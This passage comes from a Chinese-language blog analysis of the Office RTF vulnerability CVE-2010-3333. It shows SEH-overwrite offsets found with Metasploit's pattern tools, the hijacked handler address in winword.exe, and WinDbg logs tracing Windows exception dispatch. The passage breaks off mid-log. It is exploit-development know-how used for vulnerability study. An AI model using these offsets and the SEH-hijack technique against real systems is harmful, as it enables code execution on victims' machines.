SEH链尾部</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到在<code>Metasploit</code>的<code>生成样本</code>的脚本中，当前所<code>使用的环境</code>对应的<code>Target</code>中，有<code>两个偏移</code>，<code>51156</code>正是当前<code>SEH链表</code>的<code>第1个SEH记录(0x0012FFB0)</code>距pFragments缓冲区起始地址(<code>0x001237DC</code>)的偏移，而<code>24580</code>所对应的<code>栈数据</code>并不是<code>SEH链表</code>中的<code>SEH记录</code>，不太清楚为什么，实际<code>控制流劫持</code>过程中也<code>没用到</code>此处的数据。</p><p>&emsp;&emsp;覆盖栈数据<code>之后</code>，原本的SEH链表<code>被覆盖</code>，<code>覆盖之后</code>的<code>SEH链表</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">                       +----------+</span><br><span class="line">fs:[0] ---&gt; 0x0012FFB0 | 4E32704E |    指向下一个SEH记录的指针</span><br><span class="line">                       +----------+   </span><br><span class="line">            0x0012FFB4 | 704E3370 |    SE处理程序</span><br><span class="line">                       +----------+  </span><br><span class="line">                       |          |  </span><br><span class="line">               ......  |  ......  |  </span><br><span class="line">                       |          |  </span><br><span class="line">                       +----------+   </span><br><span class="line">            0x0012FFE0 | 4E38714E |    SEH链尾部</span><br><span class="line">                       +----------+</span><br><span class="line">            0x0012FFE4 | 724E3971 |    SE处理程序</span><br><span class="line">                       +----------+</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在这里<code>计算偏移量</code>时，有<code>两种方法</code>。<code>方法一</code>，手算，只要知道<code>缓冲区的起始地址</code>以及<code>SEH记录的位置</code>就可以算出偏移。<code>方法二</code>，使用<code>Metasploit</code>提供的两个工具，<code>pattern_creat.rb</code>和<code>pattern_offset.rb</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_create.rb -l 65600</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9</span><br><span class="line">.......</span><br><span class="line">6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_offset.rb -q 6E46336E -l 65600 </span></span><br><span class="line">[*] Exact match at offset 4300</span><br><span class="line">[*] Exact match at offset 24580 &lt;----</span><br><span class="line">[*] Exact match at offset 44860</span><br><span class="line">[*] Exact match at offset 65140</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_offset.rb -q 4E32704E -l 65600 </span></span><br><span class="line">[*] Exact match at offset 10596</span><br><span class="line">[*] Exact match at offset 30876</span><br><span class="line">[*] Exact match at offset 51156 &lt;----</span><br></pre></td></tr></table></figure><h4 id="4、SEH劫持过程分析"><a href="#4、SEH劫持过程分析" class="headerlink" title="4、SEH劫持过程分析"></a>4、SEH劫持过程分析</h4><p><strong><code>环境：</code></strong>XP &amp; Office2003</p><p>&emsp;&emsp;通过<code>msf</code>生成样本的脚本可知，<code>当前环境</code>所使用的用于<code>覆盖SEH处理程序地址</code>的地址为<code>0x30001bdd</code>，其位于<code>winword.exe</code>。我们使用<code>WinDbg</code>对<code>CVE-2010-3333(target2,calc).rtf</code>进行调试，首先对地址<code>0x30001bdd</code>下一个断点，然后查看<code>栈回溯</code>，通过栈回溯了解<code>SEH劫持的过程</code>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">908.</span>acc): Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line"><span class="built_in">eax</span>=7ffdb000 <span class="built_in">ebx</span>=<span class="number">00000001</span> <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=<span class="number">00000003</span> <span class="built_in">esi</span>=<span class="number">00000004</span> <span class="built_in">edi</span>=<span class="number">00000005</span></span><br><span class="line"><span class="built_in">eip</span>=7c92120e <span class="built_in">esp</span>=0387ffcc <span class="built_in">ebp</span>=0387fff4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0038</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              <span class="keyword">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; <span class="built_in">bp</span> <span class="number">0x30001bdd</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\Microsoft Office\OFFICE11\WINWORD.EXE - </span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">06420000</span> 065c1000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 5fdd0000 5fe25000   C:\WINDOWS\system32\NETAPI32.dll</span><br><span class="line">(<span class="number">908.</span>3d4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; gn</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=30001bdd <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bdd <span class="built_in">esp</span>=001233e4 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bdd</span>:</span><br><span class="line">30001bdd <span class="number">59</span>              <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line"><span class="number">00123404</span> 7c92327a 001234cc 0012ffb0 001234e8 WINWORD+<span class="number">0x1bdd</span>(<span class="number">0x30001bdd</span>,当前指令地址)</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">001234b4 7c92e46a <span class="number">00000000</span> 001234e8 001234cc ntdll!ExecuteHandler+<span class="number">0x24</span>(<span class="number">0x7c92327a</span>)[ntdll!ExecuteHandler2 (7c923282)的返回地址]</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">001234b4 30ed442c <span class="number">00000000</span> 001234e8 001234cc ntdll!KiUserExceptionDispatcher+<span class="number">0xe</span>(<span class="number">0x7c92e46a</span>)[ntdll!RtlDispatchException (7c94a950)的返回地址]</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">001237ec 42030f42 2ac372e9 d32cf01d 36a595dd mso!Ordinal1246+<span class="number">0x16b0</span>(<span class="number">0x30ed442c</span>,发生异常指令地址)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过<code>栈回溯</code>，我们可以知道，<code>0x30ed442c</code>处的指令<code>“rep movsd”</code>发生<code>内存访问异常</code>后，系统首先将<code>异常信息</code>发送给<code>调试器</code>，调试器<code>未处理该异常</code>，则将控制权交给<code>ntdll!KiUserExceptionDispatcher</code>函数。接下来的<code>调用过程</code>如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ntdll!KiUserExceptionDispatcher(PEXCEPTION_RECORD ExceptionRecord, </span><br><span class="line">                                PCONTEXT ContextRecord)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!RtlDispatchException(PEXCEPTION_RECORD ExceptionRecord, </span><br><span class="line">                           PCONTEXT ContextRecord)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!RtlpExecuteHandlerForException(PEXCEPTION_RECORD pExcptRec, </span><br><span class="line">                                     PEXCEPTION_REGISTRATION_RECORD RegistrationPointer, </span><br><span class="line">                                     CONTEXT pContext,</span><br><span class="line">                                     DISPATCHER_CONTEXT DispatcherContext,</span><br><span class="line">                                     (PEXCEPTION_ROUTINE)RegistrationPointer-&gt;Handler)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!ExecuteHandler(PEXCEPTION_RECORD pExcptRec, </span><br><span class="line">                     PEXCEPTION_REGISTRATION_RECORD RegistrationPointer, </span><br><span class="line">                     CONTEXT pContext,</span><br><span class="line">                     DISPATCHER_CONTEXT DispatcherContext,</span><br><span class="line">                     (PEXCEPTION_ROUTINE)RegistrationPointer-&gt;Handler)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!ExecuteHandler2(PEXCEPTION_RECORD pExcptRec, </span><br><span class="line">                      PEXCEPTION_REGISTRATION_RECORD RegistrationPointer, </span><br><span class="line">                      CONTEXT pContext,</span><br><span class="line">                      DISPATCHER_CONTEXT DispatcherContext,</span><br><span class="line">                      (PEXCEPTION_ROUTINE)RegistrationPointer-&gt;Handler)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">WINWORD+0x1bdd(0x30001bdd),SEH处理程序地址</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们对<code>上述函数</code>所在地址<code>下断点</code>，然后进行<code>跟踪</code>，查看<code>每个函数</code>的<code>参数内容</code>。由于这些函数的参数大多是<code>结构体指针</code>，所以我们用<code>WinDbg调试</code>可以更直观的看到这些<code>参数所对应的结构体内容</code>(dt命令)。WinDbg结合<code>符号文件</code>，可以非常清楚地显示<code>各类数据结构</code>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">140.</span>b54): Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line"><span class="built_in">eax</span>=7ffda000 <span class="built_in">ebx</span>=<span class="number">00000001</span> <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=<span class="number">00000003</span> <span class="built_in">esi</span>=<span class="number">00000004</span> <span class="built_in">edi</span>=<span class="number">00000005</span></span><br><span class="line"><span class="built_in">eip</span>=7c92120e <span class="built_in">esp</span>=0336ffcc <span class="built_in">ebp</span>=0336fff4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0038</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              <span class="keyword">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C92E45C</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C92E465</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C94A9EA</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C923256</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C923275</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C9232A6</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu <span class="number">0x30001bdd</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\Microsoft Office\OFFICE11\WINWORD.EXE - </span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; <span class="built_in">bl</span></span><br><span class="line"> <span class="number">0</span> e 7c92e45c     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!KiUserExceptionDispatcher</span><br><span class="line"> <span class="number">1</span> e 7c92e465     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!KiUserExceptionDispatcher+<span class="number">0x9</span></span><br><span class="line"> <span class="number">2</span> e 7c94a9ea     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!RtlDispatchException+<span class="number">0xac</span></span><br><span class="line"> <span class="number">3</span> e 7c923256     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!ExecuteHandler</span><br><span class="line"> <span class="number">4</span> e 7c923275     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!ExecuteHandler+<span class="number">0x1f</span></span><br><span class="line"> <span class="number">5</span> e 7c9232a6     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!ExecuteHandler2+<span class="number">0x24</span></span><br><span class="line"> <span class="number">6</span> e 30001bdd     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** WINWORD+<span class="number">0x1bdd</span></span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 5fdd0000 5fe25000   C:\WINDOWS\system32\netapi32.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 75c60000 75d00000   C:\WINDOWS\system32\urlmon.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 76d70000 76d92000   C:\WINDOWS\system32\Apphelp.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">06860000</span> 06a01000   C:\Program Files\Microsoft 